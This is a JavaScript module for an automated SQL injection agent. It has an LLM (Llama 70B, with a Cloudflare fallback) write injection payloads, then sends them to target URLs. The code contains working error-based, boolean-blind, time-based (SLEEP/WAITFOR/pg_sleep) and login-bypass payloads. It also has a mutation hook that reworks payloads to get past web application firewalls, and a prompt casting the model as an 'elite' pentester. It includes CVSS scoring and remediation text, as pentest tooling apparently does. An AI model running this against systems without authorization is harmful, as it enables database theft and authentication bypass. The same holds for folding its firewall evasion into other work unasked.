const RagMemory = require('./ragMemory');
const fs = require('fs');
const path = require('path');
const askCloudflare = require('./utils/cloudflareFallback');
require('dotenv').config();

// SQL error fingerprints for every major database (error-based detection)
const SQLI_SIGNATURES = [
  /You have an error in your SQL syntax/i,
  /Warning.*mysql_/i,
  /MySQLSyntaxErrorException/i,
  /com\.mysql\.jdbc\.exceptions/i,
  /mysql_fetch_array\(\)/i,
  /Incorrect syntax near/i,
  /Unclosed quotation mark after the character string/i,
  /Microsoft OLE DB Provider for SQL Server/i,
  /ODBC SQL Server Driver/i,
  /SQLServer JDBC Driver/i,
  /ORA-\d{5}/i,
  /quoted string not properly terminated/i,
  /oracle\.jdbc/i,
  /PostgreSQL.*ERROR/i,
  /pg_query\(\)/i,
  /SQLiteException/i,
  /sqlite3\.OperationalError/i,
  /SQL syntax.*error/i,
  /Error Executing Database Query/i,
  /Database error/i,
  /ADODB\.Field error/i,
  /Syntax error.*in query expression/i,
  /JDBC.*Exception/i,
  /java\.sql\.SQLException/i
];

// FIX #4/#5: Configurable vector cap — no silent drops
const MAX_VECTORS = 30;

class SqliAgent {
  constructor() {
    this.name = 'SQLi Expert (NVIDIA Llama 70B)';
    this.type = 'SQLi';
    this.apiKey = process.env.NVIDIA_API_KEY;
    this.logLines = [];
  }

  log(msg) {
    const line = `  [SQLi Agent] ${msg}`;
    console.log(line);
    this.logLines.push(`${new Date().toISOString()} ${line}`);
  }

  async analyze(attackVectors, io = null, scanId = null, sessionCookie = '') {
    this.log(`Starting analysis on ${attackVectors.length} vectors...`);
    if (io) io.emit('agent:update', { scanId, agent: this.type, status: 'started', vectors: attackVectors.length });
    
    const findings = [];
    const ragContext = await RagMemory.getContextForAgent(this.type);

    // FIX #4/#5: Raise cap to MAX_VECTORS and warn if any are dropped
    const skipped = attackVectors.length - MAX_VECTORS;
    if (skipped > 0) {
      console.warn(`[SQLi Agent] ⚠️ Attack surface capped at ${MAX_VECTORS} vectors — ${skipped} vectors skipped. Consider increasing MAX_VECTORS for full coverage.`);
    }
    const targets = attackVectors.slice(0, MAX_VECTORS);

    // Fire all vector analyses in parallel
    const vectorPromises = targets.map(vector => {
      if (io) io.emit('agent:update', { scanId, agent: this.type, status: 'probing', parameter: vector.parameter?.name, endpoint: vector.endpoint?.url });
      return this.testVector(vector, ragContext, sessionCookie);
    });
    const results = await Promise.allSettled(vectorPromises);

    for (const result of results) {
      if (result.status === 'fulfilled' && result.value) {
        findings.push(result.value);
      }
    }

    this.log(`Analysis complete. Found ${findings.length} SQL injection vulnerabilities.`);
    if (io) io.emit('agent:update', { scanId, agent: this.type, status: 'completed', findings: findings.length });
    this.saveLog();
    return findings;
  }

  async testVector(vector, ragContext, sessionCookie = '') {
    const { endpoint, parameter } = vector;
    if (!endpoint?.url || !parameter?.name) return null;

    this.log(`Testing ${endpoint.url} [param: ${parameter.name}]`);

    // Step 1: Ask NVIDIA to generate 6 intelligent payloads
    const payloads = await this.generatePayloads(endpoint.url, parameter.name, ragContext);
    this.log(`  → NVIDIA generated ${payloads.length} payloads for [${parameter.name}]`);

    // Step 2: Fire all payloads in parallel
    const httpPromises = payloads.map(payload => this.firePayload(endpoint, parameter.name, payload, sessionCookie));
    const responses = await Promise.allSettled(httpPromises);

    // Step 3a: Check for error-based SQLi signatures
    for (let i = 0; i < responses.length; i++) {
      if (responses[i].status !== 'fulfilled' || !responses[i].value) continue;
      const { url: testUrl, status, body, payload } = responses[i].value;

      // === WAF MUTATION ENGINE HOOK (Option 1) ===
      if (status === 403 || status === 406 || body.toLowerCase().includes('cloudflare') || body.toLowerCase().includes('waf')) {
        this.log(`  🛡️ WAF Block Detected (HTTP ${status}) for payload: "${payload}"`);
        try {
          const MutationEngine = require('../Phase3/mutationEngine');
          const mutatedPayloads = await MutationEngine.mutatePayload(payload, 'SQLi', body.substring(0, 300));
          
          // Try mutated payloads
          for (let m = 0; m < mutatedPayloads.length; m++) {
            const mutPayload = mutatedPayloads[m];
            this.log(`  → Trying mutated payload ${m+1}/${mutatedPayloads.length}: "${mutPayload}"`);
            const mutRes = await this.firePayload(endpoint, parameter.name, mutPayload, sessionCookie);
            
            if (mutRes && mutRes.status !== 403 && mutRes.status !== 406) {
              this.log(`  🔥 WAF BYPASSED! HTTP ${mutRes.status}`);
              const mutMatchedSig = SQLI_SIGNATURES.find(sig => sig.test(mutRes.body));
              if (mutMatchedSig) {
                const errorSnippet = mutRes.body.match(mutMatchedSig)?.[0] || 'Database error';
                this.log(`  ✅ SQLi CONFIRMED (WAF Bypassed)! Payload: "${mutPayload}" → "${errorSnippet}"`);
                return this.buildFinding(endpoint.url, parameter.name, mutPayload, 'Error-based (WAF Bypassed)', errorSnippet, mutRes.url);
              }
            }
          }
        } catch (mutErr) {
          this.log(`  ⚠ Mutation Engine failed: ${mutErr.message}`);
        }
      }
      // ===========================================

      const matchedSig = SQLI_SIGNATURES.find(sig => sig.test(body));
      if (matchedSig) {
        const errorSnippet = body.match(matchedSig)?.[0] || 'Database error';
        this.log(`  ✅ SQLi CONFIRMED (error-based)! Payload: "${payload}" → "${errorSnippet}"`);
        return this.buildFinding(endpoint.url, parameter.name, payload, 'Error-based', errorSnippet, testUrl);
      }
      this.log(`  ↳ Payload ${i+1}/${payloads.length}: "${payload}" → HTTP ${status} — no SQL error`);
    }

    // Step 3b: Boolean-based blind SQLi detection
    // Compare response size/content between a TRUE condition and a FALSE condition
    // If the responses differ significantly, it's blind SQLi
    const blindResult = await this.testBlindSQLi(endpoint, parameter.name, sessionCookie);
    if (blindResult) {
      this.log(`  ✅ SQLi CONFIRMED (boolean blind)! True/False responses differ by ${blindResult.diff} bytes (${blindResult.relDiff}% relative)`);
      return blindResult.finding;
    }

    // Step 3c: Time-based blind SQLi detection (SLEEP payloads)
    const timeResult = await this.testTimeBasedSQLi(endpoint, parameter.name, sessionCookie);
    if (timeResult) {
      this.log(`  ✅ SQLi CONFIRMED (time-based)! Server delayed ${timeResult.delay}ms with SLEEP payload`);
      return timeResult.finding;
    }

    // Step 3d: Login bypass detection for authentication forms
    if (parameter.name === 'uid' || parameter.name === 'username' || parameter.name === 'email' || parameter.name === 'user') {
      const bypassResult = await this.testLoginBypass(endpoint, parameter.name, sessionCookie);
      if (bypassResult) {
        this.log(`  ✅ SQLi CONFIRMED (auth bypass)! Login bypassed successfully`);
        return bypassResult;
      }
    }

    return null;
  }

  async testBlindSQLi(endpoint, paramName, sessionCookie = '') {
    try {
      // TRUE condition: ' OR '1'='1  (always true - should return data)
      // FALSE condition: ' OR '1'='2  (always false - should return empty/different)
      const truePayload  = `' OR '1'='1`;
      const falsePayload = `' OR '1'='2`;

      const [trueRes, falseRes, baseRes] = await Promise.all([
        this.firePayload(endpoint, paramName, truePayload, sessionCookie),
        this.firePayload(endpoint, paramName, falsePayload, sessionCookie),
        this.firePayload(endpoint, paramName, 'hello', sessionCookie) // baseline
      ]);

      if (!trueRes || !falseRes || !baseRes) return null;

      const truLen  = trueRes.body.length;
      const falsLen = falseRes.body.length;
      const baseLen = baseRes.body.length;

      this.log(`  [Blind SQLi] TRUE=${truLen}b FALSE=${falsLen}b BASE=${baseLen}b`);

      const diff = Math.abs(truLen - falsLen);

      // FIX: Lower threshold to 200 bytes (small PHP sites have small responses)
      // Still require relative diff >25% and true>false>base ordering
      const larger = Math.max(truLen, falsLen);
      const relDiff = larger > 0 ? (diff / larger) * 100 : 0;
      const significantDiff = (
        diff > 200 &&
        relDiff > 25 &&
        truLen > falsLen &&
        truLen > baseLen
      );

      if (significantDiff) {
        return {
          diff,
          relDiff: relDiff.toFixed(1),
          finding: this.buildFinding(
            endpoint.url, paramName, truePayload, 'Boolean-blind',
            `TRUE condition response (${truLen}b) differs from FALSE condition (${falsLen}b) by ${diff} bytes (${relDiff.toFixed(1)}% relative difference). Baseline was ${baseLen}b.`,
            this.buildUrl(endpoint.url, paramName, truePayload)
          )
        };
      } else {
        this.log(`  [Blind SQLi] Diff of ${diff}b (${relDiff.toFixed(1)}%) below threshold — not significant enough, skipping`);
      }
    } catch (e) {}
    return null;
  }

  async testTimeBasedSQLi(endpoint, paramName, sessionCookie = '') {
    // Baseline timing check
    const baseStart = Date.now();
    const baseRes = await this.firePayload(endpoint, paramName, '1', sessionCookie);
    const baseTime = Date.now() - baseStart;
    if (!baseRes) return null;

    // Time-based payloads for MySQL, MSSQL, PostgreSQL
    const sleepPayloads = [
      `1' AND SLEEP(5)-- -`,
      `1; WAITFOR DELAY '0:0:5'--`,
      `1' AND pg_sleep(5)--`,
      `1 AND 1=(SELECT 1 FROM PG_SLEEP(5))--`
    ];

    for (const payload of sleepPayloads) {
      try {
        const start = Date.now();
        const res = await this.firePayload(endpoint, paramName, payload, sessionCookie);
        const elapsed = Date.now() - start;
        // True positive only if: test delayed >= 4.5s AND baseline was fast (<2s)
        if (res && elapsed >= 4500 && baseTime < 2000) {
          this.log(`  ⏱ Time-based SQLi: Baseline=${baseTime}ms, Payload=${elapsed}ms with "${payload}"`);
          return {
            delay: elapsed,
            finding: this.buildFinding(
              endpoint.url, paramName, payload, 'Time-based Blind',
              `Server responded in ${elapsed}ms (baseline: ${baseTime}ms) when SLEEP(5) injected. Confirms blind SQL injection.`,
              this.buildUrl(endpoint.url, paramName, payload)
            )
          };
        }
      } catch (e) {}
    }
    return null;
  }

  async testLoginBypass(endpoint, paramName, sessionCookie = '') {
    // Classic auth bypass payloads for login forms
    const bypassPayloads = [`admin'--`, `' OR '1'='1'--`, `admin' OR 1=1--`];

    for (const payload of bypassPayloads) {
      try {
        const testUrl = endpoint.url;
        const controller = new AbortController();
        setTimeout(() => controller.abort(), 10000);

        const res = await fetch(testUrl, {
          method: 'POST',
          redirect: 'follow',
          signal: controller.signal,
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0'
          },
          body: `${paramName}=${encodeURIComponent(payload)}&passw=anything&password=anything&btnSubmit=Login&submit=Login`
        });
        const body = await res.text();

        // Check for successful login indicators
        const bypassIndicators = ['Sign Off', 'logout', 'My Account', 'Welcome', 'Dashboard', 'Account Summary'];
        const loginFailed = ['Invalid', 'incorrect', 'failed', 'error', 'wrong password', 'login.jsp'];
        const succeeded = bypassIndicators.some(i => body.includes(i));
        const failed = loginFailed.some(i => body.toLowerCase().includes(i.toLowerCase()));

        if (succeeded && !failed) {
          return this.buildFinding(
            endpoint.url, paramName, payload, 'Auth Bypass',
            `Authentication bypass confirmed. Login succeeded with payload "${payload}" without valid credentials.`,
            res.url
          );
        }
      } catch (e) {}
    }
    return null;
  }

  buildFinding(url, paramName, payload, technique, evidence, testUrl) {
    const cvssMap = {
      'Error-based': { score: 9.8, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H' },
      'Error-based (WAF Bypassed)': { score: 9.8, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H' },
      'Boolean-blind': { score: 9.1, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N' },
      'Time-based Blind': { score: 8.6, vector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:N' },
      'Auth Bypass': { score: 9.5, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L' },
    };
    const cvss = cvssMap[technique] || { score: 9.8, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H' };
    return {
      finding: true,
      type: 'SQL Injection',
      endpoint: url,
      parameter: paramName,
      payload,
      technique,
      severity: cvss.score >= 9.0 ? 'Critical' : 'High',
      cvss: cvss.score,
      cvssVector: cvss.vector,
      cwe: 'CWE-89',
      owasp: 'A03:2021 – Injection',
      description: `SQL Injection confirmed via ${technique} technique on parameter "${paramName}". Payload: "${payload}". Evidence: ${evidence}. This allows attackers to read, modify, or delete all database contents.`,
      proof: evidence,
      remediation: 'Use parameterized queries (prepared statements). Never concatenate user input into SQL strings. Deploy a WAF as temporary mitigation. Use least-privilege DB accounts.',
      testUrl
    };
  }

  async generatePayloads(url, paramName, ragContext) {
    const prompt = `You are an elite SQL Injection pentester. Generate exactly 6 different SQLi test payloads for this target.

Target URL: ${url}
Vulnerable Parameter: ${paramName}
${ragContext}

Generate payloads covering:
1. Classic error-based (single quote)
2. Boolean-based blind (OR 1=1)
3. UNION SELECT based
4. Stacked queries
5. Comment-based bypass
6. Auth bypass (for login params)

Return ONLY a valid JSON array of 6 payload strings. No explanation.
["' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL,NULL--", "'; SELECT 1--", "' OR '1'='1'/*", "admin'--"]`;

    try {
      const res = await fetch('https://integrate.api.nvidia.com/v1/chat/completions', {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${this.apiKey}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          model: 'meta/llama-3.3-70b-instruct',
          messages: [{ role: 'user', content: prompt }],
          max_tokens: 200,
          temperature: 0.2,
          stream: false
        })
      });
      if (res.status === 429) throw new Error('429 Rate Limit');
      const data = await res.json();
      const text = data.choices?.[0]?.message?.content?.trim() || '[]';
      const jsonStr = text.match(/\[[\s\S]*\]/)?.[0] || '[]';
      const parsed = JSON.parse(jsonStr);
      if (Array.isArray(parsed) && parsed.length > 0) return parsed.slice(0, 6);
    } catch (e) {
      this.log(`  ⚠ NVIDIA payload generation failed (${e.message}), falling back to Cloudflare AI`);
      try {
        const text = await askCloudflare(prompt);
        const jsonStr = text.match(/\[[\s\S]*\]/)?.[0] || '[]';
        const parsed = JSON.parse(jsonStr);
        if (Array.isArray(parsed) && parsed.length > 0) return parsed.slice(0, 6);
      } catch (cfErr) {
        this.log(`  ⚠ Cloudflare fallback also failed: ${cfErr.message}`);
      }
    }

    return [`' OR '1'='1`, `' OR 1=1--`, `' UNION SELECT NULL,NULL--`, `admin'--`, `' OR '1'='1'/*`, `1' AND '1'='1`];
  }

  async firePayload(endpoint, paramName, payload, sessionCookie = '') {
    try {
      const testUrl = this.buildUrl(endpoint.url, paramName, payload);
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 20000);

      const opts = {
        signal: controller.signal,
        headers: { 
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 
          'Accept': 'text/html,*/*' 
        }
      };
      if (sessionCookie) {
        opts.headers['Cookie'] = sessionCookie;
      }

      let res;
      if (endpoint.method === 'POST') {
        res = await fetch(endpoint.url, {
          ...opts, method: 'POST',
          body: `${paramName}=${encodeURIComponent(payload)}`,
          headers: { ...opts.headers, 'Content-Type': 'application/x-www-form-urlencoded' }
        });
      } else {
        res = await fetch(testUrl, { ...opts, method: 'GET' });
      }
      clearTimeout(timeout);
      const body = await res.text();
      return { url: testUrl, status: res.status, body, payload };
    } catch (e) { return null; }
  }

  buildUrl(url, paramName, payload) {
    try {
      const u = new URL(url);
      u.searchParams.set(paramName, payload);
      return u.toString();
    } catch (e) {
      return `${url}?${paramName}=${encodeURIComponent(payload)}`;
    }
  }

  saveLog() {
    try {
      const logDir = path.join(__dirname, '..', '..', 'logs');
      if (!fs.existsSync(logDir)) fs.mkdirSync(logDir, { recursive: true });
      fs.writeFileSync(path.join(logDir, `sqli-agent-${Date.now()}.log`), this.logLines.join('\n'));
    } catch (e) {}
  }
}

module.exports = new SqliAgent();
